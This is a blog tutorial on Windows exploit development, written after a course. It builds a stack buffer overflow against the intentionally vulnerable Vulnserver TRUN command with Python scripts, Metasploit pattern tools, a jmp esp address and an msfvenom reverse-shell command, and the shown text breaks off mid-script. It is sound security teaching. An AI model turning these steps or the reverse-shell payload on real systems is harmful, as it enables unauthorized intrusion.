<!doctype html>
<html lang="en">
  <head>
  <meta charset="utf-8">
<title>Windows Exploit Development: Vanilla Buffer Overflow - Giovanni Licameli</title>
<meta name="viewport" content="width=device-width, initial-scale=1">


<meta name="generator" content="Hugo 0.68.3" /><meta itemprop="name" content="Windows Exploit Development: Vanilla Buffer Overflow">
<meta itemprop="description" content="After taking an Intro to Windows Exploit Development Course, I&#39;ve consolidated my work and thoughts here.">
<meta itemprop="datePublished" content="2020-06-26T00:00:00&#43;00:00" />
<meta itemprop="dateModified" content="2020-06-26T00:00:00&#43;00:00" />
<meta itemprop="wordCount" content="3544">
<meta itemprop="image" content="https://novabutter.github.io/files/cover-pics/itwed.jpg">



<meta itemprop="keywords" content="Exploit Development,Course,Windows 7," /><meta property="og:title" content="Windows Exploit Development: Vanilla Buffer Overflow" />
<meta property="og:description" content="After taking an Intro to Windows Exploit Development Course, I&#39;ve consolidated my work and thoughts here." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://novabutter.github.io/blog/2020-6-22-windows-exploit-development-vanilla-buffer-overflow/" />
<meta property="og:image" content="https://novabutter.github.io/files/cover-pics/itwed.jpg" />
<meta property="article:published_time" content="2020-06-26T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-06-26T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://novabutter.github.io/files/cover-pics/itwed.jpg"/>

<meta name="twitter:title" content="Windows Exploit Development: Vanilla Buffer Overflow"/>
<meta name="twitter:description" content="After taking an Intro to Windows Exploit Development Course, I&#39;ve consolidated my work and thoughts here."/>
<link rel="stylesheet" href="/css/bundle.min.890f30b8b199a3d390afae9cf9f69d7a932a6a7d91fc3a3b9e5b9d780c334432.css" integrity="sha256-iQ8wuLGZo9OQr66c&#43;fadepMqan2R/Do7nludeAwzRDI=">
        <link rel="stylesheet" href="/css/add-on.css">
</head>

  <body>
    
<header id="site-header">
  <nav id="site-nav">
    <h1 class="nav-title">
      <a href="/">
        
          
            Blog
          
        
      </a>
    </h1>
    <menu id="site-nav-menu" class="flyout-menu">
      
        
          
          
            <a href="/" class="link"><i class='fa fa-home'></i> Home</a>
          
        
      
        
          
          
            <a href="/about/" class="link"><i class='far fa-id-card'></i> About</a>
          
        
      
        
          
          
            <a href="/blog/" class="link"><i class='far fa-newspaper'></i> Blog</a>
          
        
      
        
          
          
            <a href="/contact/" class="link"><i class='far fa-envelope'></i> Contact</a>
          
        
      
      <a href="#share-menu" class="share-toggle"><i class="fas fa-share-alt">&nbsp;</i>Share</a>
      

    </menu>
    

    <a href="#share-menu" class="share-toggle"><i class="fas fa-share-alt fa-2x">&nbsp;</i></a>
    <a href="#lang-menu" class="lang-toggle" lang="en">en</a>
    <a href="#site-nav" class="nav-toggle"><i class="fas fa-bars fa-2x"></i></a>
  </nav>
  <menu id="lang-menu" class="flyout-menu">
  <a href="#" lang="en" class="link active">English (en)</a>
  
    
      
    
  
</menu>

  
    <menu id="share-menu" class="flyout-menu">
      <h1>Share Post</h1>
      




  
    
    <a href="//twitter.com/share?text=Windows%20Exploit%20Development%3a%20Vanilla%20Buffer%20Overflow&amp;url=https%3a%2f%2fnovabutter.github.io%2fblog%2f2020-6-22-windows-exploit-development-vanilla-buffer-overflow%2f" target="_blank" rel="noopener" class="share-btn twitter">
        <i class="fab fa-twitter"></i><p>&nbsp;Twitter</p>
      </a>
  

  
      <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fnovabutter.github.io%2fblog%2f2020-6-22-windows-exploit-development-vanilla-buffer-overflow%2f" target="_blank" rel="noopener" class="share-btn facebook">
        <i class="fab fa-facebook"></i><p>&nbsp;Facebook</p>
        </a>
  

  
        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fnovabutter.github.io%2fblog%2f2020-6-22-windows-exploit-development-vanilla-buffer-overflow%2f&amp;title=Windows%20Exploit%20Development%3a%20Vanilla%20Buffer%20Overflow" target="_blank" rel="noopener" class="share-btn linkedin">
            <i class="fab fa-linkedin"></i><p>&nbsp;LinkedIn</p>
          </a>
  

  
        <a href="mailto:?subject=Check%20out%20this%20post%20by Giovanni%20Licameli&amp;body=https%3a%2f%2fnovabutter.github.io%2fblog%2f2020-6-22-windows-exploit-development-vanilla-buffer-overflow%2f" target="_blank" class="share-btn email" data-proofer-ignore>
          <i class="fas fa-envelope"></i><p>&nbsp;Email</p>
        </a>
  


    </menu>
  
</header>

    <div id="wrapper">
      <section id="site-intro" >
  <a href="/"><img src="/files/self.jpg" class="circle" width="270px" alt="Not Giovanni Licameli; a picture of my real-life doppelgänger" /></a>
  <header>
    <h1>Giovanni Licameli</h1>
  </header>
  <main>
    <p>Cyber Security specialist who is drawn to Wireless Penetration Testing, Networking, and high-end technical hardware.</p>
  </main>
  
    <footer>
      <ul class="socnet-icons">
        

        <li><a href="//github.com/Novabutter" target="_blank" rel="noopener" title="GitHub" class="fab fa-github"></a></li>











<li><a href="//linkedin.com/in/glicameli" target="_blank" rel="noopener" title="LinkedIn" class="fab fa-linkedin"></a></li>




























      </ul>
    </footer>
  
</section>

      <main id="site-main">
        <article class="post">
  <header>
  <div class="title">
    
      <h2><a href="/blog/2020-6-22-windows-exploit-development-vanilla-buffer-overflow/">Windows Exploit Development: Vanilla Buffer Overflow</a></h2>
    
    
      <p>After taking an Intro to Windows Exploit Development Course, I&#39;ve consolidated my work and thoughts here.</p>
    
  </div>
  <div class="meta">
    <time class="published" datetime="2020-06-26 00:00:00 &#43;0000 UTC">
      June 26, 2020
    </time>
    <span class="author">Giovanni Licameli</span>
    
      <p>17 minute read</p>
    
  </div>
</header>

  <section id="socnet-share">
    




  
    
    <a href="//twitter.com/share?text=Windows%20Exploit%20Development%3a%20Vanilla%20Buffer%20Overflow&amp;url=https%3a%2f%2fnovabutter.github.io%2fblog%2f2020-6-22-windows-exploit-development-vanilla-buffer-overflow%2f" target="_blank" rel="noopener" class="share-btn twitter">
        <i class="fab fa-twitter"></i><p>&nbsp;Twitter</p>
      </a>
  

  
      <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fnovabutter.github.io%2fblog%2f2020-6-22-windows-exploit-development-vanilla-buffer-overflow%2f" target="_blank" rel="noopener" class="share-btn facebook">
        <i class="fab fa-facebook"></i><p>&nbsp;Facebook</p>
        </a>
  

  
        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fnovabutter.github.io%2fblog%2f2020-6-22-windows-exploit-development-vanilla-buffer-overflow%2f&amp;title=Windows%20Exploit%20Development%3a%20Vanilla%20Buffer%20Overflow" target="_blank" rel="noopener" class="share-btn linkedin">
            <i class="fab fa-linkedin"></i><p>&nbsp;LinkedIn</p>
          </a>
  

  
        <a href="mailto:?subject=Check%20out%20this%20post%20by Giovanni%20Licameli&amp;body=https%3a%2f%2fnovabutter.github.io%2fblog%2f2020-6-22-windows-exploit-development-vanilla-buffer-overflow%2f" target="_blank" class="share-btn email" data-proofer-ignore>
          <i class="fas fa-envelope"></i><p>&nbsp;Email</p>
        </a>
  


  </section>
  
  <a href="/blog/2020-6-22-windows-exploit-development-vanilla-buffer-overflow/" class="image featured">
    
      <img src="/files/cover-pics/itwed.jpg" alt="">
    
  </a>


  <div class="content">
    <h2 id="prologue">Prologue</h2>
<p>Exploit Development is an art that only a select few venture to explore. So many of us run the script and watch it fail only to sit back and think <em>well that didn&rsquo;t work. Oh well.</em> It takes enormous amounts of time, knowledge, and Googling while testing, failing, and failing a thousand more times until finally something happens. It&rsquo;s these individuals that frighten the world; that have the motivation to press onward into nearly always unfamiliar territory to find vulnerabilities in applications for the good or bad. And lucky for us, many of them have the heart to share their findings in order to train those with the same motivation but without the compass.</p>
<p>With the help of the <a href="https://github.com/connormcgarr/An-Intro-2-Win-ED">Intro to Windows Exploit Development Course</a> we&rsquo;ll build an exploit utilizing <a href="https://github.com/stephenbradshaw/vulnserver">Vulnserver</a> using a vanilla buffer overflow with ASLR and DEP disabled.</p>
<h2 id="all-the-wswell-some-of-them">All the W&rsquo;s&hellip;well some of them.</h2>
<h3 id="where">Where</h3>
<p><strong>vulnserver.exe</strong> running on Windows 7 x86 (32-bit) machine with ASLR and DEP disabled.</p>
<h3 id="what">What</h3>
<p>The vulnerable command of the application is <code>TRUN</code> command. We don&rsquo;t know what this does, but we&rsquo;ll soon find out how it is vulnerable.</p>
<h3 id="why-disable-aslr-and-dep">Why disable ASLR and DEP?</h3>
<p>ASLR and DEP are Address Space Layout Randomization and Data Execution Prevention respectively. The former is responsible for scrambling memory addresses on each boot of the machine, while the latter is a mitigation which prevents the execution of foreign code on the stack of the thread (threads are contained inside a what Windows calls a process). With DEP, the stack can either be written to or what is on the stack may be executed, but both cannot happen concurrently. Both are attempts (and can be decent ones at that) of which to prevent binary exploitation. There&rsquo;s a lot more to both of these mitigations that are outside the scope of this post.</p>
<p>The reason these mitigations need to be disabled are for educational purposes. Keeping memory addresses static (disabling ASLR) allows us to hard code memory addresses into the exploit for now which is easier than finding the vulnerabilities in ASLR itself being far outside the scope of a vanilla buffer overflow. The same goes for DEP; it&rsquo;s not the best mitigation tool in practice but having to deal with first learning about the stack and seeing how it can be abused by writing and executing are the basics.</p>
<p>There is no need to have your arms and legs handcuffed when learning how to walk.</p>
<h2 id="basecamp-prepping-for-the-journey">Basecamp: Prepping for the Journey</h2>
<p>Before we begin there are few key terms to point out that are often referenced. We need to know what and where our gear is before we begin hiking.</p>
<h4 id="32-bit-registers">32-bit registers</h4>
<p>Registers are used to transfer data through the OS. x86 and x64 systems each have different registers, but any 32-bit application will run with the same registers regardless of the system. There are nine registers in the x86 architecture, of which three are vitally important when discussing the stack and building out exploit:</p>
<ol>
<li><strong>ESP</strong>: Stack pointer to the top of the stack.</li>
<li><strong>EBP</strong>: Base pointer to the beginning/bottom of the stack frame.</li>
<li><strong>EIP</strong>: Instruction pointer pointing to the current memory address of the instructions being executed.</li>
</ol>
<h4 id="the-stack">The Stack</h4>
<p>The stack is a pretty common sight for a programmer; it&rsquo;s the first-in, last-out philosophy of interpretation of instructions. While it seems decently simple it can be a challenge to initially wrap one&rsquo;s head around.</p>
<p><span style="display:block;text-align:center"><img src="/files/Windows-Exploit-Development-Course/Stack.png" alt="General Picture of a Stack Frame" width="300px" height="400px"></span></p>
<p>Here you can see the representation of a single stack frame (the stack itself is something different). This section of instructions in memory from high addresses down to low addresses as the stack grows downward. The registers mentioned above are filled with the memory addresses of these locations so the machine knows where the beginning, end, and current section of execution inside of the stack are. In this post we&rsquo;ll be overflowing these locations intentionally with our own code.</p>
<p>As this post is a light review of the contents of a course, the explanation on how buffer overflows work is outside of its scope.</p>
<h4 id="windbg">WinDbg</h4>
<p>A standard debugger developed my Microsoft that allows developers (and exploit developers) to follow the low-level behavior of an application.</p>
<p><span style="display:block;text-align:center;"><img src="/files/Windows-Exploit-Development-Course/WinDbg.png" alt="Layout of WinDgb"></span></p>
<p>With this tool we can look at CPU registers and what their values are, monitor and pause program behavior, and take a look inside the memory space of the application thread.</p>
<h2 id="a-blindfolded-hike-fuzzing-the-application">A Blindfolded Hike: Fuzzing the Application</h2>
<p>Now we can begin the process of developing our exploit. In our case finding out where exactly to start looking for our vulnerability is first and we can continue onward from there. What we do know is that the vulnerable command of the application is <code>TRUN</code>, so let&rsquo;s start there. In the case of vulnserver, the server is waiting for connections and interaction on port 9999. Interacting with <code>TRUN</code> normally, it expects a small dataset like an integer or string.</p>
<p><span style="display:block;text-align:center;size=80%;"><img src="/files/Windows-Exploit-Development-Course/TRUN-command.png" alt="TRUN command interaction"></span></p>
<p>What if we fed it quite a bit more than that? After all <code>TRUN</code> is a command and therefore a function with limited space on the stack that we may be able to overflow to reach areas of memory we shouldn&rsquo;t have access to. These set of actions are known as &ldquo;Fuzzing&rdquo;. Fuzzing is the process of attempting to force unintended behavior of a program ideally resulting in a crash or exception. This can be achieved by sending any data the application may not expect to interpret. What if we built a simple script to just send a massive string or set of characters? Let&rsquo;s try sending 5,000 &lsquo;A&rsquo; characters with the <code>TRUN</code> command to see what happens.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> socket
<span style="color:#75715e"># Vulnerable command</span>
command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;TRUN /.:/&#34;</span><span style="color:#f92672">.</span>encode()
<span style="color:#75715e"># 5000 bytes to crash the application</span>
crash <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">5000</span>
<span style="color:#75715e"># Send data remotely to machine via port 9999</span>
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Sending 5000 bytes…&#34;</span>)
s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;[IP Address]&#34;</span>, <span style="color:#ae81ff">9999</span>))
s<span style="color:#f92672">.</span>send(command <span style="color:#f92672">+</span> crash)
s<span style="color:#f92672">.</span>close()
</code></pre></div><p><span style="display:block;text-align:center;size=60%;"><img src="/files/Windows-Exploit-Development-Course/vuln-crash.png" alt="vuln server crashing"></span></p>
<p>Would you look at that! We crashed the program. And if we check our register values, we can see that both EBP and EIP were overwritten with the hex value for &lsquo;A&rsquo;, <code>\x41</code>.</p>
<p><span style="display:block;text-align:center;size=80%;"><img src="/files/Windows-Exploit-Development-Course/vuln-crash-registers.png" alt="vuln server overwritten registers"></span></p>
<p>Additionally, if we take a look at the memory location that <strong>ESP</strong> is pointing to (<code>0x1acf9e0</code>), you can see that we have also overwritten the values at ESP.</p>
<p><span style="display:block;text-align:center;size=70%;"><img src="/files/Windows-Exploit-Development-Course/vuln-crash-esp.png" alt="vuln server overwritten registers"></span></p>
<p>We know that sending 5,000 bytes will give us control of the three key registers! What does this mean? Well, as EIP is controlled, whatever is put into that register will be executed (remember DEP is disabled). So now the goal is probably getting EIP to execute our own code somehow. The issue is while we know we control that register, we don&rsquo;t exactly know how many bytes it took to get to EIP—we only know that it is controllable. Going back to our hiking metaphor, we blindfolded ourselves and accidentally ventured up and over the mountain. The problem is we wanted to stop at its peak so we control where we go next on our journey, but we don&rsquo;t know how many steps it takes to reach the top; just that 5,000 is enough to get up and over. So how do we find out?</p>
<h2 id="marking-the-trail-calculating-the-offset">Marking the Trail: Calculating the Offset</h2>
<p>We know that 5,000 steps will get us over the mountain but we need a way to figure out exactly when we reached the top so we can stop and look around. To find out where EIP is, we need to generate some sort of unique string pattern that&rsquo;s at least 5,000 bytes long so we can crash the application. Say with each step we took on our journey we dropped a different color flare, knowing which flare is tied to which step number. We could look back after we crossed the mountain at its peak and see what color flare sits there to figure out exactly how many steps it took to reach it. With the unique pattern, we can can search whichever characters appear in EIP and find out exactly how many bytes lead up to EIP. Thankfully Metasploit contains a ruby script that will do just that for us. All we have to do is run the following command to generate our unique pattern:</p>
<p><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [number of bytes]</code></p>
<p>This will generate our pattern for us. From here we can pass the result into our currently expanding exploit.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> socket
<span style="color:#75715e"># Vulnerable command</span>
command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;TRUN /.:/&#34;</span>
<span style="color:#75715e"># 5000 bytes to crash the application</span>
crash <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;RESULT-OF-METASPLOIT-RUBY-BYTE-PATTERN&#34;</span>
<span style="color:#75715e"># Send data remotely to Win 7 VM via port 9999</span>
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Sending 5000 bytes…&#34;</span>)
s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;[IP Address]&#34;</span>, <span style="color:#ae81ff">9999</span>))
encoded <span style="color:#f92672">=</span> (command <span style="color:#f92672">+</span> crash)<span style="color:#f92672">.</span>encode()
s<span style="color:#f92672">.</span>send(encoded)
s<span style="color:#f92672">.</span>close()
</code></pre></div><p>Now running our in-process exploit reveals that EIP holds the hex values of the characters that have overridden EIP. In this case, my values are <code>386f4337</code>.</p>
<p><span style="display:block;text-align:center;size=70%;"><img src="/files/Windows-Exploit-Development-Course/uniq-fuzz.png" alt="vuln server overwritten registers with pattern"></span></p>
<p>We can figure out where that may be with another ruby script to calculate our offset:</p>
<p><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q [hex value from EIP]</code></p>
<p>The ruby script spits out an exact offset of 2003. Now we know that to reach the EIP register, it takes 2003 bytes of filler. This also means that 2004-2007 are the 4 bytes that sit in the EIP register. Recall that all 32-bit registers are 4 byte registers because the architecture (32-bit applications) only allows a maximum of 4 concurrent bytes to be transferred at a time.</p>
<p>Amazing. We now control the EIP register and can give it exact bytes to execute because we know where it is now. Just for validity&rsquo;s sake however, let us make sure we have done our calculations correctly by sending our own predicted pattern of characters to ensure the registers are where we think.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> socket
<span style="color:#75715e"># Vulnerable command</span>
command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;TRUN /.:/&#34;</span><span style="color:#f92672">.</span>encode()
<span style="color:#75715e"># 5000 bytes to crash the application</span>
<span style="color:#75715e"># Send &#39;A&#39; as the offset number of times, then we&#39;ll be in EIP.</span>
crash <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2003</span>
<span style="color:#75715e"># Test fill EIP with &#39;B&#39;</span>
crash <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x42</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
<span style="color:#75715e"># Fill the rest with &#39;C&#39;</span>
crash <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x43</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">5000</span><span style="color:#f92672">-</span>len(crash))
<span style="color:#75715e"># Send data remotely to Win 7 VM via port 9999</span>
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Sending 5000 bytes…&#34;</span>)
s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;[IP Address]&#34;</span>, <span style="color:#ae81ff">9999</span>))
s<span style="color:#f92672">.</span>send(command <span style="color:#f92672">+</span> crash)
s<span style="color:#f92672">.</span>close()
</code></pre></div><p>If we run our current half-exploit, we can see that the registers have all of the exact values we anticipated.</p>
<p><span style="display:block;text-align:center;size=80%;"><img src="/files/Windows-Exploit-Development-Course/validation.png" alt="suspected register values validated"></span></p>
<p><strong>EBP</strong>: <code>41414141</code> (AAAA)<br>
<strong>EIP</strong>: <code>42424242</code> (BBBB)<br>
<strong>ESP</strong>: <span>→</span> <code>43434343</code> (CCCC)</p>
<p>From this, we have been able to gather that EBP is just before EIP, and if we take a look at the call stack, we can see that immediately after our &lsquo;B&rsquo;s were called, &lsquo;C&rsquo;s were called, meaning that we know ESP is just after EIP as well.</p>
<p><span style="display:block;text-align:center;size=70%;"><img src="/files/Windows-Exploit-Development-Course/callStack.png" alt="validated call stack"></span></p>
<p>We control it all, and we now know where EIP is. Recall that the EIP register will execute whatever it is given, so if we can tell EIP to execute something, we might just be able to have it execute our own code to get a shell right? Sort of, but onto crafting our official exploit.</p>
<h2 id="atop-the-world--pointing-out-home-pointing-eip-in-the-right-direction">Atop the World &amp; Pointing Out Home: Pointing EIP in the Right Direction</h2>
<p>Right now we control EIP, ESP, and EBP. We know that EIP executes opcodes or shellcode, and that this is the key to getting our exploit working. The course of action here since we do control multiple areas of the stack and therefore memory is to simply generate a payload, write that into memory, and have it be executed. Sounds like a plan, but EIP doesn&rsquo;t directly execute opcodes; it only accepts memory addresses or pointers meaning we can&rsquo;t directly dump a payload into EIP. Now this is a problem, so what can we do with EIP to get our payload to execute?</p>
<p>Let us think about this. We control EBP, ESP, and EIP. Once we pass EBP (2003 bytes in), we land at our execute controller EIP, then right after that is at least another 2,993 bytes before the program for sure crashes after we overflow our buffer and access a protected area of memory. In reality, if we take a look at where the buffer ends (where our &lsquo;C&rsquo; character stops appearing) after ESP, we have a total of 980 bytes to work with; the rest is cut off after our access violation. Regardless, it sounds like either with EBP or ESP, they have room to store data (we are overflowing it anyway, so we can store whatever we want there). We could store a payload within the remaining bytes of ESP or EBP (though EBP requires jumping backwards in memory which is outside the scope of this post). Perfect!</p>
<p>Wait wait. Just because we have a payload in memory doesn&rsquo;t mean it will be executed. Hmmm&hellip;E-X-E-C-U-T-E-D&hellip;.Bingo! We can give EIP instructions that tell it to execute what is in ESP which is where we can put our payload!</p>
<p><span style="display:block;text-align:center"><img src="/files/Windows-Exploit-Development-Course/overflowVisual.png" alt="Current Overflow Plan Visualized" width="300px" height="400px"></span></p>
<p>Final question before we put everything together; <em>what</em> instruction are we giving EIP? There are a few options here. We know that ESP is immediately after EIP, so we could pop 4 bytes off the stack, but in general ESP may not always be immediately after EIP so we&rsquo;d rather not use that rather unreliable approach. There is however an instruction which will jump to the the top of the stack or ESP when executed. That would be reliable no matter the memory address, so let us use that.</p>
<p>What we are looking for is <code>jmp esp</code> in assembly. Remember that registers work with memory addresses, so we are looking for specific a location in memory that contains that particular instruction. Once we find that location, we can hardcode that address into our exploit after we offset to EIP. EIP will be given the memory address to execute, which is the memory address corresponding with our <code>jmp esp</code> instruction. This will jump EIP to the memory address of ESP which contains our payload that will start executing. That&rsquo;s the plan anyway.</p>
<p>First we have to find out if there even is a <code>jmp esp</code> instruction within our program. It is important that we search for the opcode within the application and not the OS due to the frequency of the updates an OS has, which would break our exploit. The corresponding opcode for the said instruction is <code>\xFF \xE4</code>. Using WinDbg, we can look to see if this opcode exists within the program. We can find this by searching through the memory reserved for the application.</p>
<p><span style="display:block;text-align:center;size=70%;"><img src="/files/Windows-Exploit-Development-Course/jmpESP.png" alt="Finding JMP ESP within program"></span></p>
<p>There is a few <code>FF E4</code> or <code>jmp esp</code> instructions, but we&rsquo;ll use the one with the memory address of <code>625011af</code> within the <strong>essfuncl.dll</strong> DLL.
By overwriting our <code>\x42</code>s with this new address in memory, once EIP is reached it will look at our memory address for instructions to execute. Then EIP will see the <code>jmp esp</code> instruction at that address and then jump to the memory address of ESP and execute whatever is there.</p>
<p>There is a small issue we need to address here however. Currently, <code>625011af</code> is displayed in Big-Endian format. However, our processor reads memory addresses in Little-Endian format. To compensate for this, we&rsquo;ll use the python <strong>struct</strong> library to reverse the format so we do not have to manually change this ourselves. Using our memory address for our <code>jmp esp</code> using the endian conversion, the line that fills EIP in our exploit may look something like this:</p>
<p><code>crash += struct.pack('&lt;L', 625011af)</code></p>
<p>As a proof of concept, we should set a breakpoint in WinDbg at our memory address of <code>jmp esp</code>, then step through to see what happens after that instruction is executed. The exploit should contain our latest changes before testing our theory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> struct
<span style="color:#f92672">import</span> socket
<span style="color:#75715e"># Vulnerable command</span>
command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;TRUN /.:/&#34;</span><span style="color:#f92672">.</span>encode()
<span style="color:#75715e"># 5000 bytes to crash the application</span>
<span style="color:#75715e"># Send &#39;A&#39; as the offset number of times, then we&#39;ll be in EIP.</span>
crash <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2003</span>
<span style="color:#75715e"># Knowing where jmp esp is in memory, push this address into the already known EIP.</span>
<span style="color:#75715e"># This will make EIP point to this memory address to exexute, which will jump to ESP</span>
<span style="color:#75715e"># which at the moment (but not for long) is filled with &#39;C&#39;.</span>
crash <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,[MEMORY ADDRESS])
<span style="color:#75715e"># &#39;&lt;L&#39; will convert the address to little-endian format for the CPU to process.</span>
<span style="color:#75715e"># Fill the rest with &#39;C&#39;</span>
crash <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x43</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">5000</span><span style="color:#f92672">-</span>len(crash))
<span style="color:#75715e"># Send data remotely to Win 7 VM via port 9999</span>
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Sending 5000 bytes…&#34;</span>)
s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
s<span style="color:#f92672">.</span>send(command <span style="color:#f92672">+</span> crash)
s<span style="color:#f92672">.</span>close()
</code></pre></div><p>If our theory is correct, EIP will point to the memory address of ESP (which is currently set to be filled with &lsquo;C&rsquo; or &lsquo;43434343&rsquo;) and attempt to execute everything at that memory address. Let&rsquo;s run it.</p>
<p><span style="display:block;text-align:center;size=70%;"><img src="/files/Windows-Exploit-Development-Course/EIPfillJMP.png" alt="EIP filled with JMP ESP memory location"></span></p>
<p>Okay so EIP is filled with the memory location <code>0x625011af</code>, which means we filled EIP correctly with the Little-Endian memory address for our jump instruction. Since the location for this instruction is in EIP which executes, <code>jmp esp</code> should be executed and we should see EIP fill with the same memory location as ESP currently has.</p>
<p><span style="display:block;text-align:center;size=70%;"><img src="/files/Windows-Exploit-Development-Course/EIPfillESP.png" alt="EIP filled with ESP location"></span></p>
<p>The theory checks out and we landed in ESP. EIP will execute what is located at ESP.</p>
<h2 id="have-fun-sledding-down-implementing-the-payload">Have Fun Sledding Down: Implementing the Payload</h2>
<p>We still need to generate our payload though to put in ESP instead of have a sea of &lsquo;C&rsquo;s. This is by no means the only choice, but let&rsquo;s use a reverse shell over port 443. We can do that with the following:</p>
<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=[YOUR ATTACKER IP] LPORT=443 -f python -b &quot;\x0&quot;: -v payload</code></p>
<p>Dump the result into your exploit overwriting the filler of &lsquo;C&rsquo;. If we account for the space taken up by our payload (it will say after it is generated how many bytes. In this case it is 351 bytes) and what we have left in ESP—we still have 629 bytes still able to be filled. To make our exploit more stable, many exploit developers utilize NOPs, otherwise known as no-operations. Just as they sound, these instructions do absolutely nothing and when executed nothing will happen until a non-NOP instruction appears. Many of these in a row is referred to as a NOP sled because the execution will slide through the NOPs until it hits actual instructions. In this case, we could pad our payload with NOPs to fill the buffer of with a total of 980 bytes consisting of 351 bytes of our payload and 629 NOPs. So let&rsquo;s add the instruction code <code>\x90</code> to our exploit 629 times before our payload.</p>
<p>To summarize, we control all the registers and decided that writing a payload to the fluffy ESP is ideal. We also developed a way to get EIP to execute <code>jmp esp</code> instruction that will point it directly at our payload in ESP. To make our exploit a bit more stable, we also padded our payload with NOPs so instead of the application crashing during our exploit it may recover.</p>
<p><span style="display:block;text-align:center"><img src="/files/Windows-Exploit-Development-Course/overflowVisualFinal.png" alt="Final Overflow Plan Visualized" width="300px" height="400px"></span></p>
<p>Let&rsquo;s see what our exploit looks like after all of this.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> struct
<span style="color:#f92672">import</span> socket
<span style="color:#f92672">import</span> time
<span style="color:#75715e"># Vulnerable command</span>
command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;TRUN /.:/&#34;</span><span style="color:#f92672">.</span>encode()
<span style="color:#75715e"># Reverse Shell Payload from msfvenom:</span>
payload <span style="color:#f92672">=</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;[PAYLOAD OUTPUT]&#34;</span>
<span style="color:#75715e"># 5000 bytes to crash the application</span>
<span style="color:#75715e"># Send &#39;A&#39; as the offset number of times, then we&#39;ll be in EIP.</span>
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Preparing Offset to EIP&#34;</span>)
